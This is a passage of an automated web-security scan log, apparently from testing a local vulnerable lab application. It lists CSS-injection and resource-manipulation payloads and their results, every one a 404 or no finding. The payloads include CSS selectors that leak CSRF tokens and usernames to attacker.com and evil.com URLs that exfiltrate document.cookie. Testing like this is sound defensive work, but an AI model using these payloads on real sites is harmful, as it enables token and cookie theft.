+2025-08-05 14:40:54.030263 |   - Testing payload: red\3b \62 ackground-color\3a blue
+2025-08-05 14:40:54.031262 |     [!] HTTP 404 with payload 'red\3b \62 ackground-color\3a blue' (URL parameter)
+2025-08-05 14:40:54.031262 |   - Testing payload: \72\65\64\3b\62\61\63\6b\67\72\6f\75\6e\64\2d\63\6f\6c\6f\72\3a\62\6c\75\65
+2025-08-05 14:40:54.033452 |     [!] HTTP 404 with payload '\72\65\64\3b\62\61\63\6b\67\72\6f\75\6e\64\2d\63\6f\6c\6f\72\3a\62\6c\75\65' (URL parameter)
+2025-08-05 14:40:54.034061 |   - Testing hash CSS payload: red; background-color: blue
+2025-08-05 14:40:54.035317 |     [!] HTTP 404 with payload 'red; background-color: blue' (URL hash)
+2025-08-05 14:40:54.035317 |   - Testing hash CSS payload: red; font-size: 100px
+2025-08-05 14:40:54.036821 |     [!] HTTP 404 with payload 'red; font-size: 100px' (URL hash)
+2025-08-05 14:40:54.036821 |   - Testing hash CSS payload: red; -o-link:'javascript:alert(1)'
+2025-08-05 14:40:54.039036 |     [!] HTTP 404 with payload 'red; -o-link:'javascript:alert(1)'' (URL hash)
+2025-08-05 14:40:54.039036 |   - Testing hash CSS payload: red; -o-link-source: current
+2025-08-05 14:40:54.041041 |     [!] HTTP 404 with payload 'red; -o-link-source: current' (URL hash)
+2025-08-05 14:40:54.041041 |   - Testing hash CSS payload: expression(alert(1))
+2025-08-05 14:40:54.042460 |     [!] HTTP 404 with payload 'expression(alert(1))' (URL hash)
+2025-08-05 14:40:54.042460 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/csrf/
+2025-08-05 14:40:54.050814 |   - No obvious CSS sinks found in page source
+2025-08-05 14:40:54.050814 |   - Testing payload: red; background-color: blue
+2025-08-05 14:40:54.054822 |     [-] No obvious CSS injection with payload 'red; background-color: blue' (URL parameter)
+2025-08-05 14:40:54.054822 |   - Testing payload: red; font-size: 100px
+2025-08-05 14:40:54.058331 |     [-] No obvious CSS injection with payload 'red; font-size: 100px' (URL parameter)
+2025-08-05 14:40:54.059331 |   - Testing payload: red; -o-link:'javascript:alert(1)'
+2025-08-05 14:40:54.062331 |     [-] No obvious CSS injection with payload 'red; -o-link:'javascript:alert(1)'' (URL parameter)
+2025-08-05 14:40:54.062331 |   - Testing payload: red; -o-link-source: current
+2025-08-05 14:40:54.065429 |     [-] No obvious CSS injection with payload 'red; -o-link-source: current' (URL parameter)
+2025-08-05 14:40:54.066429 |   - Testing payload: expression(alert(1))
+2025-08-05 14:40:54.068997 |     [-] No obvious CSS injection with payload 'expression(alert(1))' (URL parameter)
+2025-08-05 14:40:54.070202 |   - Testing payload: red; -moz-binding: url('http://attacker.com/xss.xml')
+2025-08-05 14:40:54.073293 |     [-] No obvious CSS injection with payload 'red; -moz-binding: url('http://attacker.com/xss.xml')' (URL parameter)
+2025-08-05 14:40:54.073293 |   - Testing payload: red; } input[name=csrf_token][value^=a] { background-image: url(http://attacker.com/?a); }
+2025-08-05 14:40:54.076797 |     [-] No obvious CSS injection with payload 'red; } input[name=csrf_token][value^=a] { background-image: url(http://attacker.com/?a); }' (URL parameter)
+2025-08-05 14:40:54.076797 |   - Testing payload: red; } input[name=user][value^=a] { background-image: url(http://attacker.com/?a); }
+2025-08-05 14:40:54.079796 |     [-] No obvious CSS injection with payload 'red; } input[name=user][value^=a] { background-image: url(http://attacker.com/?a); }' (URL parameter)
+2025-08-05 14:40:54.080969 |   - Testing payload: red; @import url('http://attacker.com/malicious.css')
+2025-08-05 14:40:54.083978 |     [-] No obvious CSS injection with payload 'red; @import url('http://attacker.com/malicious.css')' (URL parameter)
+2025-08-05 14:40:54.083978 |   - Testing payload: red; @font-face { font-family: x; src: url('http://attacker.com/steal') }
+2025-08-05 14:40:54.086978 |     [-] No obvious CSS injection with payload 'red; @font-face { font-family: x; src: url('http://attacker.com/steal') }' (URL parameter)
+2025-08-05 14:40:54.086978 |   - Testing payload: red; behavior: url(xss.htc)
+2025-08-05 14:40:54.089978 |     [-] No obvious CSS injection with payload 'red; behavior: url(xss.htc)' (URL parameter)
+2025-08-05 14:40:54.091158 |   - Testing payload: red; animation-name: x; @keyframes x { from { background: url('http://attacker.com/?x') } }
+2025-08-05 14:40:54.094167 |     [-] No obvious CSS injection with payload 'red; animation-name: x; @keyframes x { from { background: url('http://attacker.com/?x') } }' (URL parameter)
+2025-08-05 14:40:54.094167 |   - Testing payload: red; @media screen { div { background-image: url('http://attacker.com/?screen') } }
+2025-08-05 14:40:54.097247 |     [-] No obvious CSS injection with payload 'red; @media screen { div { background-image: url('http://attacker.com/?screen') } }' (URL parameter)
+2025-08-05 14:40:54.098247 |   - Testing payload: red; @namespace x 'http://attacker.com/malicious'
+2025-08-05 14:40:54.100246 |     [-] No obvious CSS injection with payload 'red; @namespace x 'http://attacker.com/malicious'' (URL parameter)
+2025-08-05 14:40:54.101392 |   - Testing payload: r\65 d; background-color: blue
+2025-08-05 14:40:54.104391 |     [-] No obvious CSS injection with payload 'r\65 d; background-color: blue' (URL parameter)
+2025-08-05 14:40:54.104391 |   - Testing payload: red\3b \62 ackground-color\3a blue
+2025-08-05 14:40:54.107391 |     [-] No obvious CSS injection with payload 'red\3b \62 ackground-color\3a blue' (URL parameter)
+2025-08-05 14:40:54.107391 |   - Testing payload: \72\65\64\3b\62\61\63\6b\67\72\6f\75\6e\64\2d\63\6f\6c\6f\72\3a\62\6c\75\65
+2025-08-05 14:40:54.110843 |     [-] No obvious CSS injection with payload '\72\65\64\3b\62\61\63\6b\67\72\6f\75\6e\64\2d\63\6f\6c\6f\72\3a\62\6c\75\65' (URL parameter)
+2025-08-05 14:40:54.111841 |   - Testing hash CSS payload: red; background-color: blue
+2025-08-05 14:40:54.114998 |     [-] No obvious CSS injection with payload 'red; background-color: blue' (URL hash)
+2025-08-05 14:40:54.114998 |   - Testing hash CSS payload: red; font-size: 100px
+2025-08-05 14:40:54.117998 |     [-] No obvious CSS injection with payload 'red; font-size: 100px' (URL hash)
+2025-08-05 14:40:54.117998 |   - Testing hash CSS payload: red; -o-link:'javascript:alert(1)'
+2025-08-05 14:40:54.121090 |     [-] No obvious CSS injection with payload 'red; -o-link:'javascript:alert(1)'' (URL hash)
+2025-08-05 14:40:54.122090 |   - Testing hash CSS payload: red; -o-link-source: current
+2025-08-05 14:40:54.125291 |     [-] No obvious CSS injection with payload 'red; -o-link-source: current' (URL hash)
+2025-08-05 14:40:54.125291 |   - Testing hash CSS payload: expression(alert(1))
+2025-08-05 14:40:54.128817 |     [-] No obvious CSS injection with payload 'expression(alert(1))' (URL hash)
+2025-08-05 14:40:54.129338 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/upload/
+2025-08-05 14:40:54.132484 |   - No obvious CSS sinks found in page source
+2025-08-05 14:40:54.133155 |   - Testing payload: red; background-color: blue
+2025-08-05 14:40:54.136290 |     [-] No obvious CSS injection with payload 'red; background-color: blue' (URL parameter)
+2025-08-05 14:40:54.136290 |   - Testing payload: red; font-size: 100px
+2025-08-05 14:40:54.139868 |     [-] No obvious CSS injection with payload 'red; font-size: 100px' (URL parameter)
+2025-08-05 14:40:54.139868 |   - Testing payload: red; -o-link:'javascript:alert(1)'
+2025-08-05 14:40:54.147803 |     [-] No obvious CSS injection with payload 'red; -o-link:'javascript:alert(1)'' (URL parameter)
+2025-08-05 14:40:54.147803 |   - Testing payload: red; -o-link-source: current
+2025-08-05 14:40:54.151802 |     [-] No obvious CSS injection with payload 'red; -o-link-source: current' (URL parameter)
+2025-08-05 14:40:54.151802 |   - Testing payload: expression(alert(1))
+2025-08-05 14:40:54.155024 |     [-] No obvious CSS injection with payload 'expression(alert(1))' (URL parameter)
+2025-08-05 14:40:54.156023 |   - Testing payload: red; -moz-binding: url('http://attacker.com/xss.xml')
+2025-08-05 14:40:54.159592 |     [-] No obvious CSS injection with payload 'red; -moz-binding: url('http://attacker.com/xss.xml')' (URL parameter)
+2025-08-05 14:40:54.159592 |   - Testing payload: red; } input[name=csrf_token][value^=a] { background-image: url(http://attacker.com/?a); }
+2025-08-05 14:40:54.163935 |     [-] No obvious CSS injection with payload 'red; } input[name=csrf_token][value^=a] { background-image: url(http://attacker.com/?a); }' (URL parameter)
+2025-08-05 14:40:54.163935 |   - Testing payload: red; } input[name=user][value^=a] { background-image: url(http://attacker.com/?a); }
+2025-08-05 14:40:54.167107 |     [-] No obvious CSS injection with payload 'red; } input[name=user][value^=a] { background-image: url(http://attacker.com/?a); }' (URL parameter)
+2025-08-05 14:40:54.168107 |   - Testing payload: red; @import url('http://attacker.com/malicious.css')
+2025-08-05 14:40:54.171108 |     [-] No obvious CSS injection with payload 'red; @import url('http://attacker.com/malicious.css')' (URL parameter)
+2025-08-05 14:40:54.172111 |   - Testing payload: red; @font-face { font-family: x; src: url('http://attacker.com/steal') }
+2025-08-05 14:40:54.175416 |     [-] No obvious CSS injection with payload 'red; @font-face { font-family: x; src: url('http://attacker.com/steal') }' (URL parameter)
+2025-08-05 14:40:54.175416 |   - Testing payload: red; behavior: url(xss.htc)
+2025-08-05 14:40:54.179579 |     [-] No obvious CSS injection with payload 'red; behavior: url(xss.htc)' (URL parameter)
+2025-08-05 14:40:54.179579 |   - Testing payload: red; animation-name: x; @keyframes x { from { background: url('http://attacker.com/?x') } }
+2025-08-05 14:40:54.182579 |     [-] No obvious CSS injection with payload 'red; animation-name: x; @keyframes x { from { background: url('http://attacker.com/?x') } }' (URL parameter)
+2025-08-05 14:40:54.183579 |   - Testing payload: red; @media screen { div { background-image: url('http://attacker.com/?screen') } }
+2025-08-05 14:40:54.186626 |     [-] No obvious CSS injection with payload 'red; @media screen { div { background-image: url('http://attacker.com/?screen') } }' (URL parameter)
+2025-08-05 14:40:54.187644 |   - Testing payload: red; @namespace x 'http://attacker.com/malicious'
+2025-08-05 14:40:54.191214 |     [-] No obvious CSS injection with payload 'red; @namespace x 'http://attacker.com/malicious'' (URL parameter)
+2025-08-05 14:40:54.191214 |   - Testing payload: r\65 d; background-color: blue
+2025-08-05 14:40:54.195215 |     [-] No obvious CSS injection with payload 'r\65 d; background-color: blue' (URL parameter)
+2025-08-05 14:40:54.195215 |   - Testing payload: red\3b \62 ackground-color\3a blue
+2025-08-05 14:40:54.199396 |     [-] No obvious CSS injection with payload 'red\3b \62 ackground-color\3a blue' (URL parameter)
+2025-08-05 14:40:54.199396 |   - Testing payload: \72\65\64\3b\62\61\63\6b\67\72\6f\75\6e\64\2d\63\6f\6c\6f\72\3a\62\6c\75\65
+2025-08-05 14:40:54.202711 |     [-] No obvious CSS injection with payload '\72\65\64\3b\62\61\63\6b\67\72\6f\75\6e\64\2d\63\6f\6c\6f\72\3a\62\6c\75\65' (URL parameter)
+2025-08-05 14:40:54.203762 |   - Testing hash CSS payload: red; background-color: blue
+2025-08-05 14:40:54.206949 |     [-] No obvious CSS injection with payload 'red; background-color: blue' (URL hash)
+2025-08-05 14:40:54.208080 |   - Testing hash CSS payload: red; font-size: 100px
+2025-08-05 14:40:54.211782 |     [-] No obvious CSS injection with payload 'red; font-size: 100px' (URL hash)
+2025-08-05 14:40:54.211782 |   - Testing hash CSS payload: red; -o-link:'javascript:alert(1)'
+2025-08-05 14:40:54.214792 |     [-] No obvious CSS injection with payload 'red; -o-link:'javascript:alert(1)'' (URL hash)
+2025-08-05 14:40:54.216163 |   - Testing hash CSS payload: red; -o-link-source: current
+2025-08-05 14:40:54.219327 |     [-] No obvious CSS injection with payload 'red; -o-link-source: current' (URL hash)
+2025-08-05 14:40:54.219327 |   - Testing hash CSS payload: expression(alert(1))
+2025-08-05 14:40:54.222526 |     [-] No obvious CSS injection with payload 'expression(alert(1))' (URL hash)
+2025-08-05 14:40:54.222526 | ----- OTG-CLIENT-005 Test Completed -----
+
+2025-08-05 14:45:54.694502 | [+] Login successful (Status: 200)
+2025-08-05 14:45:54.748097 | [+] Security level set to low
+2025-08-05 14:45:54.749102 | ----- Starting OTG-CLIENT-006 (Client Side Resource Manipulation) -----
+2025-08-05 14:45:54.749102 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/xss_d/
+2025-08-05 14:45:54.753785 |   - Found potential resource sink: src=
+2025-08-05 14:45:54.753785 |   - Found potential resource sink: href=
+2025-08-05 14:45:54.754801 |   - Testing payload: http://evil.com/malicious.js
+2025-08-05 14:45:54.758816 |     [-] No obvious resource injection with payload 'http://evil.com/malicious.js' (URL parameter)
+2025-08-05 14:45:54.758816 |   - Testing payload: //evil.com/malicious.js
+2025-08-05 14:45:54.763527 |     [-] No obvious resource injection with payload '//evil.com/malicious.js' (URL parameter)
+2025-08-05 14:45:54.763527 |   - Testing payload: data:text/javascript,alert(1)
+2025-08-05 14:45:54.767103 |     [-] No obvious resource injection with payload 'data:text/javascript,alert(1)' (URL parameter)
+2025-08-05 14:45:54.768106 |   - Testing payload: http://evil.com/phishing.html
+2025-08-05 14:45:54.771113 |     [-] No obvious resource injection with payload 'http://evil.com/phishing.html' (URL parameter)
+2025-08-05 14:45:54.771113 |   - Testing payload: javascript:alert(document.cookie)
+2025-08-05 14:45:54.775115 |     [-] No obvious resource injection with payload 'javascript:alert(document.cookie)' (URL parameter)
+2025-08-05 14:45:54.776113 |   - Testing payload: http://evil.com/log.php?cookie=${document.cookie}
+2025-08-05 14:45:54.779118 |     [-] No obvious resource injection with payload 'http://evil.com/log.php?cookie=${document.cookie}' (URL parameter)
+2025-08-05 14:45:54.779118 |   - Testing payload: x" onerror="alert(1)
+2025-08-05 14:45:54.783310 |     [-] No obvious resource injection with payload 'x" onerror="alert(1)' (URL parameter)
+2025-08-05 14:45:54.784308 |   - Testing payload: http://evil.com/malicious.swf
+2025-08-05 14:45:54.788312 |     [-] No obvious resource injection with payload 'http://evil.com/malicious.swf' (URL parameter)
+2025-08-05 14:45:54.788312 |   - Testing payload: data:application/x-shockwave-flash,alert(1)
+2025-08-05 14:45:54.793113 |     [-] No obvious resource injection with payload 'data:application/x-shockwave-flash,alert(1)' (URL parameter)
+2025-08-05 14:45:54.793642 |   - Testing payload: http://evil.com/malicious.css
+2025-08-05 14:45:54.797805 |     [-] No obvious resource injection with payload 'http://evil.com/malicious.css' (URL parameter)
+2025-08-05 14:45:54.798327 |   - Testing payload: javascript:alert(1);
+2025-08-05 14:45:54.802336 |     [-] No obvious resource injection with payload 'javascript:alert(1);' (URL parameter)
+2025-08-05 14:45:54.802336 |   - Testing payload: http://evil.com/steal.php?data=
+2025-08-05 14:45:54.806084 |     [-] No obvious resource injection with payload 'http://evil.com/steal.php?data=' (URL parameter)
+2025-08-05 14:45:54.806610 |   - Testing payload: /api/userdata?callback=evilFunction
+2025-08-05 14:45:54.810857 |     [-] No obvious resource injection with payload '/api/userdata?callback=evilFunction' (URL parameter)
+2025-08-05 14:45:54.811386 |   - Testing payload: hTtP://evil.com
+2025-08-05 14:45:54.815651 |     [-] No obvious resource injection with payload 'hTtP://evil.com' (URL parameter)
+2025-08-05 14:45:54.816198 |   - Testing payload: http://127.0.0.1@evil.com
+2025-08-05 14:45:54.820265 |     [-] No obvious resource injection with payload 'http://127.0.0.1@evil.com' (URL parameter)
+2025-08-05 14:45:54.820265 |   - Testing payload: http://evil.com\@attacker.com
+2025-08-05 14:45:54.823778 |     [-] No obvious resource injection with payload 'http://evil.com\@attacker.com' (URL parameter)
+2025-08-05 14:45:54.823778 |   - Testing payload: http://evil.com?.victim.com
+2025-08-05 14:45:54.828571 |     [-] No obvious resource injection with payload 'http://evil.com?.victim.com' (URL parameter)
+2025-08-05 14:45:54.828571 |   - Testing payload: chrome-extension://malicious
+2025-08-05 14:45:54.832754 |     [-] No obvious resource injection with payload 'chrome-extension://malicious' (URL parameter)
+2025-08-05 14:45:54.833275 |   - Testing payload: ms-browser-extension://malicious
+2025-08-05 14:45:54.836987 |     [-] No obvious resource injection with payload 'ms-browser-extension://malicious' (URL parameter)
+2025-08-05 14:45:54.837636 |   - Testing hash resource payload: http://evil.com/malicious.js
+2025-08-05 14:45:54.841251 |     [-] No obvious resource injection with payload 'http://evil.com/malicious.js' (URL hash)
+2025-08-05 14:45:54.841853 |   - Testing hash resource payload: //evil.com/malicious.js
+2025-08-05 14:45:54.845511 |     [-] No obvious resource injection with payload '//evil.com/malicious.js' (URL hash)
+2025-08-05 14:45:54.845511 |   - Testing hash resource payload: data:text/javascript,alert(1)
+2025-08-05 14:45:54.849836 |     [-] No obvious resource injection with payload 'data:text/javascript,alert(1)' (URL hash)
+2025-08-05 14:45:54.850366 |   - Testing hash resource payload: http://evil.com/phishing.html
+2025-08-05 14:45:54.856045 |     [-] No obvious resource injection with payload 'http://evil.com/phishing.html' (URL hash)
+2025-08-05 14:45:54.856780 |   - Testing hash resource payload: javascript:alert(document.cookie)
+2025-08-05 14:45:54.861647 |     [-] No obvious resource injection with payload 'javascript:alert(document.cookie)' (URL hash)
+2025-08-05 14:45:54.862168 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/client/
+2025-08-05 14:45:54.865438 |   - No obvious resource sinks found in page source
+2025-08-05 14:45:54.865438 |   - Testing payload: http://evil.com/malicious.js
+2025-08-05 14:45:54.868107 |     [!] HTTP 404 with payload 'http://evil.com/malicious.js' (URL parameter)
+2025-08-05 14:45:54.868630 |   - Testing payload: //evil.com/malicious.js
+2025-08-05 14:45:54.872118 |     [!] HTTP 404 with payload '//evil.com/malicious.js' (URL parameter)
+2025-08-05 14:45:54.872648 |   - Testing payload: data:text/javascript,alert(1)
+2025-08-05 14:45:54.874816 |     [!] HTTP 404 with payload 'data:text/javascript,alert(1)' (URL parameter)
+2025-08-05 14:45:54.875347 |   - Testing payload: http://evil.com/phishing.html
+2025-08-05 14:45:54.877422 |     [!] HTTP 404 with payload 'http://evil.com/phishing.html' (URL parameter)
+2025-08-05 14:45:54.878531 |   - Testing payload: javascript:alert(document.cookie)
+2025-08-05 14:45:54.880715 |     [!] HTTP 404 with payload 'javascript:alert(document.cookie)' (URL parameter)
+2025-08-05 14:45:54.880715 |   - Testing payload: http://evil.com/log.php?cookie=${document.cookie}
+2025-08-05 14:45:54.881714 |     [!] HTTP 404 with payload 'http://evil.com/log.php?cookie=${document.cookie}' (URL parameter)
+2025-08-05 14:45:54.882956 |   - Testing payload: x" onerror="alert(1)
+2025-08-05 14:45:54.884967 |     [!] HTTP 404 with payload 'x" onerror="alert(1)' (URL parameter)
+2025-08-05 14:45:54.884967 |   - Testing payload: http://evil.com/malicious.swf
+2025-08-05 14:45:54.888014 |     [!] HTTP 404 with payload 'http://evil.com/malicious.swf' (URL parameter)
+2025-08-05 14:45:54.888014 |   - Testing payload: data:application/x-shockwave-flash,alert(1)
+2025-08-05 14:45:54.891408 |     [!] HTTP 404 with payload 'data:application/x-shockwave-flash,alert(1)' (URL parameter)
+2025-08-05 14:45:54.892655 |   - Testing payload: http://evil.com/malicious.css
+2025-08-05 14:45:54.894669 |     [!] HTTP 404 with payload 'http://evil.com/malicious.css' (URL parameter)
+2025-08-05 14:45:54.894669 |   - Testing payload: javascript:alert(1);
+2025-08-05 14:45:54.895669 |     [!] HTTP 404 with payload 'javascript:alert(1);' (URL parameter)
+2025-08-05 14:45:54.897177 |   - Testing payload: http://evil.com/steal.php?data=
+2025-08-05 14:45:54.898184 |     [!] HTTP 404 with payload 'http://evil.com/steal.php?data=' (URL parameter)
+2025-08-05 14:45:54.899203 |   - Testing payload: /api/userdata?callback=evilFunction
+2025-08-05 14:45:54.900735 |     [!] HTTP 404 with payload '/api/userdata?callback=evilFunction' (URL parameter)
+2025-08-05 14:45:54.900735 |   - Testing payload: hTtP://evil.com
+2025-08-05 14:45:54.901904 |     [!] HTTP 404 with payload 'hTtP://evil.com' (URL parameter)
+2025-08-05 14:45:54.902905 |   - Testing payload: http://127.0.0.1@evil.com
+2025-08-05 14:45:54.904230 |     [!] HTTP 404 with payload 'http://127.0.0.1@evil.com' (URL parameter)
+2025-08-05 14:45:54.904797 |   - Testing payload: http://evil.com\@attacker.com
+2025-08-05 14:45:54.905811 |     [!] HTTP 404 with payload 'http://evil.com\@attacker.com' (URL parameter)
+2025-08-05 14:45:54.906815 |   - Testing payload: http://evil.com?.victim.com
+2025-08-05 14:45:54.907815 |     [!] HTTP 404 with payload 'http://evil.com?.victim.com' (URL parameter)
+2025-08-05 14:45:54.908815 |   - Testing payload: chrome-extension://malicious
+2025-08-05 14:45:54.910325 |     [!] HTTP 404 with payload 'chrome-extension://malicious' (URL parameter)
+2025-08-05 14:45:54.910325 |   - Testing payload: ms-browser-extension://malicious
+2025-08-05 14:45:54.912530 |     [!] HTTP 404 with payload 'ms-browser-extension://malicious' (URL parameter)
+2025-08-05 14:45:54.912530 |   - Testing hash resource payload: http://evil.com/malicious.js
+2025-08-05 14:45:54.913538 |     [!] HTTP 404 with payload 'http://evil.com/malicious.js' (URL hash)
+2025-08-05 14:45:54.914538 |   - Testing hash resource payload: //evil.com/malicious.js
+2025-08-05 14:45:54.916045 |     [!] HTTP 404 with payload '//evil.com/malicious.js' (URL hash)
+2025-08-05 14:45:54.916045 |   - Testing hash resource payload: data:text/javascript,alert(1)
+2025-08-05 14:45:54.918050 |     [!] HTTP 404 with payload 'data:text/javascript,alert(1)' (URL hash)
+2025-08-05 14:45:54.918050 |   - Testing hash resource payload: http://evil.com/phishing.html
+2025-08-05 14:45:54.920643 |     [!] HTTP 404 with payload 'http://evil.com/phishing.html' (URL hash)
+2025-08-05 14:45:54.920643 |   - Testing hash resource payload: javascript:alert(document.cookie)
+2025-08-05 14:45:54.921647 |     [!] HTTP 404 with payload 'javascript:alert(document.cookie)' (URL hash)
+2025-08-05 14:45:54.922811 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/upload/
+2025-08-05 14:45:54.925829 |   - Found potential resource sink: src=
+2025-08-05 14:45:54.925829 |   - Found potential resource sink: href=
+2025-08-05 14:45:54.927336 |   - Testing payload: http://evil.com/malicious.js
+2025-08-05 14:45:54.930406 |     [-] No obvious resource injection with payload 'http://evil.com/malicious.js' (URL parameter)
+2025-08-05 14:45:54.930406 |   - Testing payload: //evil.com/malicious.js
+2025-08-05 14:45:54.934571 |     [-] No obvious resource injection with payload '//evil.com/malicious.js' (URL parameter)
+2025-08-05 14:45:54.934571 |   - Testing payload: data:text/javascript,alert(1)
+2025-08-05 14:45:54.938159 |     [-] No obvious resource injection with payload 'data:text/javascript,alert(1)' (URL parameter)
+2025-08-05 14:45:54.938159 |   - Testing payload: http://evil.com/phishing.html
+2025-08-05 14:45:54.942170 |     [-] No obvious resource injection with payload 'http://evil.com/phishing.html' (URL parameter)
+2025-08-05 14:45:54.942170 |   - Testing payload: javascript:alert(document.cookie)
+2025-08-05 14:45:54.946350 |     [-] No obvious resource injection with payload 'javascript:alert(document.cookie)' (URL parameter)
+2025-08-05 14:45:54.946350 |   - Testing payload: http://evil.com/log.php?cookie=${document.cookie}
+2025-08-05 14:45:54.950343 |     [-] No obvious resource injection with payload 'http://evil.com/log.php?cookie=${document.cookie}' (URL parameter)
+2025-08-05 14:45:54.950343 |   - Testing payload: x" onerror="alert(1)
+2025-08-05 14:45:54.953850 |     [-] No obvious resource injection with payload 'x" onerror="alert(1)' (URL parameter)
+2025-08-05 14:45:54.954857 |   - Testing payload: http://evil.com/malicious.swf
+2025-08-05 14:45:54.958011 |     [-] No obvious resource injection with payload 'http://evil.com/malicious.swf' (URL parameter)
+2025-08-05 14:45:54.958011 |   - Testing payload: data:application/x-shockwave-flash,alert(1)
+2025-08-05 14:45:54.962009 |     [-] No obvious resource injection with payload 'data:application/x-shockwave-flash,alert(1)' (URL parameter)
+2025-08-05 14:45:54.963010 |   - Testing payload: http://evil.com/malicious.css
+2025-08-05 14:45:54.966201 |     [-] No obvious resource injection with payload 'http://evil.com/malicious.css' (URL parameter)
+2025-08-05 14:45:54.966201 |   - Testing payload: javascript:alert(1);
+2025-08-05 14:45:54.969904 |     [-] No obvious resource injection with payload 'javascript:alert(1);' (URL parameter)
+2025-08-05 14:45:54.970901 |   - Testing payload: http://evil.com/steal.php?data=
+2025-08-05 14:45:54.974328 |     [-] No obvious resource injection with payload 'http://evil.com/steal.php?data=' (URL parameter)
+2025-08-05 14:45:54.974328 |   - Testing payload: /api/userdata?callback=evilFunction
+2025-08-05 14:45:54.978472 |     [-] No obvious resource injection with payload '/api/userdata?callback=evilFunction' (URL parameter)
+2025-08-05 14:45:54.979470 |   - Testing payload: hTtP://evil.com
+2025-08-05 14:45:54.983488 |     [-] No obvious resource injection with payload 'hTtP://evil.com' (URL parameter)
+2025-08-05 14:45:54.983488 |   - Testing payload: http://127.0.0.1@evil.com
+2025-08-05 14:45:54.987655 |     [-] No obvious resource injection with payload 'http://127.0.0.1@evil.com' (URL parameter)
+2025-08-05 14:45:54.987655 |   - Testing payload: http://evil.com\@attacker.com
+2025-08-05 14:45:54.991652 |     [-] No obvious resource injection with payload 'http://evil.com\@attacker.com' (URL parameter)
+2025-08-05 14:45:54.992655 |   - Testing payload: http://evil.com?.victim.com
+2025-08-05 14:45:54.995651 |     [-] No obvious resource injection with payload 'http://evil.com?.victim.com' (URL parameter)
+2025-08-05 14:45:54.995651 |   - Testing payload: chrome-extension://malicious
+2025-08-05 14:45:55.000078 |     [-] No obvious resource injection with payload 'chrome-extension://malicious' (URL parameter)
+2025-08-05 14:45:55.000078 |   - Testing payload: ms-browser-extension://malicious
+2025-08-05 14:45:55.003773 |     [-] No obvious resource injection with payload 'ms-browser-extension://malicious' (URL parameter)
+2025-08-05 14:45:55.004302 |   - Testing hash resource payload: http://evil.com/malicious.js
+2025-08-05 14:45:55.007444 |     [-] No obvious resource injection with payload 'http://evil.com/malicious.js' (URL hash)
+2025-08-05 14:45:55.007444 |   - Testing hash resource payload: //evil.com/malicious.js
+2025-08-05 14:45:55.010676 |     [-] No obvious resource injection with payload '//evil.com/malicious.js' (URL hash)
+2025-08-05 14:45:55.010676 |   - Testing hash resource payload: data:text/javascript,alert(1)
+2025-08-05 14:45:55.014886 |     [-] No obvious resource injection with payload 'data:text/javascript,alert(1)' (URL hash)
+2025-08-05 14:45:55.014886 |   - Testing hash resource payload: http://evil.com/phishing.html
+2025-08-05 14:45:55.017898 |     [-] No obvious resource injection with payload 'http://evil.com/phishing.html' (URL hash)
+2025-08-05 14:45:55.017898 |   - Testing hash resource payload: javascript:alert(document.cookie)
+2025-08-05 14:45:55.021076 |     [-] No obvious resource injection with payload 'javascript:alert(document.cookie)' (URL hash)
+2025-08-05 14:45:55.022079 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/fi/
+2025-08-05 14:45:55.028074 |   - Found potential resource sink: src=
+2025-08-05 14:45:55.028074 |   - Found potential resource sink: href=
+2025-08-05 14:45:55.028074 |   - Testing payload: http://evil.com/malicious.js
+2025-08-05 14:45:55.034327 |     [-] No obvious resource injection with payload 'http://evil.com/malicious.js' (URL parameter)
+2025-08-05 14:45:55.034327 |   - Testing payload: //evil.com/malicious.js
+2025-08-05 14:45:55.040546 |     [-] No obvious resource injection with payload '//evil.com/malicious.js' (URL parameter)
+2025-08-05 14:45:55.040546 |   - Testing payload: data:text/javascript,alert(1)
+2025-08-05 14:45:55.047142 |     [-] No obvious resource injection with payload 'data:text/javascript,alert(1)' (URL parameter)
+2025-08-05 14:45:55.047673 |   - Testing payload: http://evil.com/phishing.html
+2025-08-05 14:45:55.053749 |     [-] No obvious resource injection with payload 'http://evil.com/phishing.html' (URL parameter)
+2025-08-05 14:45:55.053749 |   - Testing payload: javascript:alert(document.cookie)
+2025-08-05 14:45:55.059356 |     [-] No obvious resource injection with payload 'javascript:alert(document.cookie)' (URL parameter)
+2025-08-05 14:45:55.060356 |   - Testing payload: http://evil.com/log.php?cookie=${document.cookie}
+2025-08-05 14:45:55.065583 |     [-] No obvious resource injection with payload 'http://evil.com/log.php?cookie=${document.cookie}' (URL parameter)
+2025-08-05 14:45:55.066580 |   - Testing payload: x" onerror="alert(1)
+2025-08-05 14:45:55.071587 |     [-] No obvious resource injection with payload 'x" onerror="alert(1)' (URL parameter)
+2025-08-05 14:45:55.072589 |   - Testing payload: http://evil.com/malicious.swf
+2025-08-05 14:45:55.078585 |     [-] No obvious resource injection with payload 'http://evil.com/malicious.swf' (URL parameter)
+2025-08-05 14:45:55.078585 |   - Testing payload: data:application/x-shockwave-flash,alert(1)
+2025-08-05 14:45:55.085763 |     [-] No obvious resource injection with payload 'data:application/x-shockwave-flash,alert(1)' (URL parameter)
+2025-08-05 14:45:55.086758 |   - Testing payload: http://evil.com/malicious.css
+2025-08-05 14:45:55.095952 |     [-] No obvious resource injection with payload 'http://evil.com/malicious.css' (URL parameter)
+2025-08-05 14:45:55.095952 |   - Testing payload: javascript:alert(1);
+2025-08-05 14:45:55.101958 |     [-] No obvious resource injection with payload 'javascript:alert(1);' (URL parameter)
+2025-08-05 14:45:55.103445 |   - Testing payload: http://evil.com/steal.php?data=
+2025-08-05 14:45:55.110284 |     [-] No obvious resource injection with payload 'http://evil.com/steal.php?data=' (URL parameter)
+2025-08-05 14:45:55.110284 |   - Testing payload: /api/userdata?callback=evilFunction
+2025-08-05 14:45:55.116443 |     [-] No obvious resource injection with payload '/api/userdata?callback=evilFunction' (URL parameter)
+2025-08-05 14:45:55.117653 |   - Testing payload: hTtP://evil.com
+2025-08-05 14:45:55.123756 |     [-] No obvious resource injection with payload 'hTtP://evil.com' (URL parameter)
+2025-08-05 14:45:55.123756 |   - Testing payload: http://127.0.0.1@evil.com
+2025-08-05 14:45:55.130522 |     [-] No obvious resource injection with payload 'http://127.0.0.1@evil.com' (URL parameter)
+2025-08-05 14:45:55.130522 |   - Testing payload: http://evil.com\@attacker.com
